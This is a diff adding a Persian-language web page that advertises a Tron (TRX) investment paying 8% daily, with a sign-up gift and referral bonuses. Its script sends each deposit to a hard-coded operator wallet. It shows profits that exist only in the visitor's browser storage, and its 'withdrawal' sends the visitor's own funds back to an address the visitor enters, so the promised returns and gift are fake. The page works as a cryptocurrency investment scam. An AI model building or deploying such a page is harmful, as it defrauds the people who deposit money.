@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سرمایه‌گذاری ترون | سود روزانه ۸٪</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.0.0/dist/TronWeb.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            width: 350px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            text-align: center;
+        }
+        button {
+            background: #ff8c00;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ffa500;
+        }
+        .reward-box {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>💰 سرمایه‌گذاری ترون - سود روزانه ۸٪</h2>
+        <p>🎁 ثبت‌نام کنید و ۱۰ TRX هدیه بگیرید!</p>
+        
+        <h2>📥 واریز TRX</h2>
+        <input type="number" id="depositAmount" placeholder="مقدار TRX">
+        <button onclick="depositTron()">✅ واریز و شروع کسب سود</button>
+        <p id="status"></p>
+        
+        <h2>💵 سود روزانه شما</h2>
+        <p id="dailyProfit">0 TRX</p>
+        <button onclick="requestWithdrawal()">📤 درخواست برداشت</button>
+        
+        <div class="reward-box">
+            🎉 دعوت از دوستان = دریافت ۵٪ از واریز آن‌ها!
+        </div>
+    </div>
+    
+    <script>
+        const adminAddress = "TMSwTUk99URijAwo1zSF753LCLXxrj4hyr"; // آدرس کیف پول مدیر
+        
+        // واریز TRX
+        async function depositTron() {
+            let amount = document.getElementById("depositAmount").value;
+            if (!amount || amount <= 0) {
+                alert("لطفاً مقدار معتبر TRX وارد کنید!");
+                return;
+            }
+    
+            try {
+                let transaction = await window.tronWeb.trx.sendTransaction(adminAddress, amount * 1e6);
+                if (transaction.result) {
+                    let userData = JSON.parse(localStorage.getItem("user")) || { balance: 0 };
+                    userData.balance += parseFloat(amount);
+                    localStorage.setItem("user", JSON.stringify(userData));
+                    document.getElementById("status").innerText = "واریز موفقیت‌آمیز بود!";
+                    updateProfit();
+                } else {
+                    document.getElementById("status").innerText = "خطا در واریز!";
+                }
+            } catch (error) {
+                console.error(error);
+                document.getElementById("status").innerText = "خطا در تراکنش!";
+            }
+        }
+        
+        // بروزرسانی سود روزانه
+        function updateProfit() {
+            let userData = JSON.parse(localStorage.getItem("user"));
+            if (userData && userData.balance) {
+                let dailyProfit = userData.balance * 0.08;
+                document.getElementById("dailyProfit").innerText = `سود روزانه شما: ${dailyProfit.toFixed(2)} TRX`;
+            }
+        }
+        
+        // درخواست برداشت
+        async function requestWithdrawal() {
+            let userData = JSON.parse(localStorage.getItem("user"));
+            if (userData && userData.balance) {
+                let dailyProfit = userData.balance * 0.08;
+                let withdrawalAddress = prompt("لطفاً آدرس کیف پول خود را وارد کنید:");
+
+                if (withdrawalAddress) {
+                    alert(`درخواست برداشت ثبت شد. مبلغ ${dailyProfit.toFixed(2)} TRX به آدرس شما ارسال خواهد شد.`);
+                    await sendTRXToUser(withdrawalAddress, dailyProfit);
+                } else {
+                    alert("آدرس کیف پول معتبر وارد نشده است.");
+                }
+            } else {
+                alert("شما موجودی ندارید!");
+            }
+        }
+
+        // ارسال TRX به آدرس کاربر به صورت اتوماتیک
+        async function sendTRXToUser(userAddress, amount) {
+            try {
+                let transaction = await window.tronWeb.trx.sendTransaction(userAddress, amount * 1e6);
+                if (transaction.result) {
+                    console.log(`تراکنش به آدرس ${userAddress} با موفقیت انجام شد.`);
+                } else {
+                    console.error("خطا در ارسال TRX!");
+                }
+            } catch (error) {
+                console.error("خطا در ارسال تراکنش:", error);
+            }
+        }
+
+        // هدیه به کاربر
+        function checkBonus() {
+            let userData = JSON.parse(localStorage.getItem("user"));
+            if (!userData) {
+                localStorage.setItem("user", JSON.stringify({ balance: 10 }));
+                alert("🎉 شما ۱۰ TRX هدیه دریافت کردید!");
+                updateProfit();
+            }
+        }
+
+        setInterval(updateProfit, 10000); // بروزرسانی سود هر 10 ثانیه
+    </script>
+</body>
+</html>
